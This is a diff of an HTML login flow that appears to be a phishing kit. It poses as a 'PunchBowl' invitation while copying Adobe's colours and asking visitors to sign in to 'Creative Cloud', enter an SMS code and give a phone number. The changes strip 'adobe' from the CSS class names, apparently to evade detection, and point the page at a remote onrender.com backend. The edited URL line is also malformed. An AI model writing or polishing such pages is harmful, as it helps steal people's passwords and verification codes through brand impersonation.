@@ -105,10 +105,10 @@
     }
 
     
-    .adobe-logo {
+    .logo {
       display: flex; align-items: center; gap: 10px; margin-bottom: 32px;
     }
-    .adobe-logo-icon {
+    .logo-icon {
       width: 40px; height: 40px;
       background: var(--red);
       border-radius: 10px;
@@ -117,7 +117,7 @@
       letter-spacing: -1px;
       box-shadow: 0 4px 20px rgba(235,16,0,0.4);
     }
-    .adobe-logo-text {
+    .logo-text {
       font-size: 22px; font-weight: 700; color: var(--text);
       letter-spacing: -0.3px;
     }
@@ -342,9 +342,9 @@
 
   <!-- ===== MAIN SCREEN ===== -->
   <div id="mainScreen" class="screen active">
-    <div class="adobe-logo">
-      <div class="adobe-logo-icon">P</div>
-      <div class="adobe-logo-text">PunchBowl</div>
+    <div class="logo">
+      <div class="logo-icon">P</div>
+      <div class="logo-text">PunchBowl</div>
     </div>
     <h1>You're Invited!</h1>
     <p class="sub">Sign in to continue to your Cloud dashboard and access all your files.</p>
@@ -373,9 +373,9 @@
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
       Back
     </button>
-    <div class="adobe-logo">
-      <div class="adobe-logo-icon">P</div>
-      <div class="adobe-logo-text">PunchBowl</div>
+    <div class="logo">
+      <div class="logo-icon">P</div>
+      <div class="logo-text">PunchBowl</div>
     </div>
     <h1>Welcome back</h1>
     <p class="sub">Enter your credentials to access your Creative Cloud.</p>
@@ -403,9 +403,9 @@
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
       Back
     </button>
-    <div class="adobe-logo">
-      <div class="adobe-logo-icon">P</div>
-      <div class="adobe-logo-text">PunchBowl</div>
+    <div class="logo">
+      <div class="logo-icon">P</div>
+      <div class="logo-text">PunchBowl</div>
     </div>
     <h1>Create account</h1>
     <p class="sub">Start your creative journey with punchbowl today.</p>
@@ -460,9 +460,9 @@
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
       Back
     </button>
-    <div class="adobe-logo">
-      <div class="adobe-logo-icon">P</div>
-      <div class="adobe-logo-text">PunchBowl</div>
+    <div class="logo">
+      <div class="logo-icon">P</div>
+      <div class="logo-text">PunchBowl</div>
     </div>
     <h1>Enter the code</h1>
     <div class="sms-badge">
@@ -490,9 +490,9 @@
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>
       Back
     </button>
-    <div class="adobe-logo">
-      <div class="adobe-logo-icon">P</div>
-      <div class="adobe-logo-text">PunchBowl</div>
+    <div class="logo">
+      <div class="logo-icon">P</div>
+      <div class="logo-text">PunchBowl</div>
     </div>
     <h1>Phone verification</h1>
     <p class="sub">For extra security, please provide your phone number to receive a verification code.</p>
@@ -547,7 +547,7 @@
   // Change this to your deployed backend URL (e.g. https://your-app.railway.app)
   const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
     ? 'http://localhost:3000'
-    : https://punch-app-backend-4mwt.onrender.com/; // when served from same origin as backend
+    : 'https://punch-app-backend-4mwt.onrender.com/;'
 
   // ─── STATE ────────────────────────────────────────────────
   let currentSessionId = null;
